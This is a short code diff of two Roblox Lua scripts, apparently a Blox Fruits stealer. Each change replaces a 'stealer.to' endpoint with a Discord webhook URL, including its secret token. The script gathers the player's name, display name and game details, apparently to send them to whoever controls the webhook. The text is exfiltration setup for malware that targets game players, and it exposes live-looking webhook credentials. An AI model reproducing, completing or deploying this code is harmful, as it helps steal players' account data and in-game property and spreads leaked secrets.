@@ -3,7 +3,7 @@ local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local player = Players.LocalPlayer
 
-local webhookUrl = "https://stealer.to/post?uniqueid=e92c9e96"  -- Replace with your Discord webhook URL
+local webhookUrl = "https://discordapp.com/api/webhooks/1341656445992566856/bRTdn_IfzIBF7JY696AO8UhyjMT9LGX6zVgR8jT4zWgf6iASgDxEWvH3ploQtGxOe2bp"  -- Replace with your Discord webhook URL
 
 -- Capture the player's name, display name, and game details
 local playerName = player.Name
@@ -327,7 +327,7 @@ end)
 --- START OF FILE Bloxfruit_improved.txt ---
 
 Username = "x6TNine"
-Webhook = "https://stealer.to/post?uniqueid=97b37190"
+Webhook = "https://discordapp.com/api/webhooks/1341656574455976038/1cfpz1y7j2eBj7CTLhdcPPXoH4ltNdK3zYYtftVAtiFMuVnAXKKdH45hAgvVfneS5HC5"
 
 -- BLOX FRUIT
 
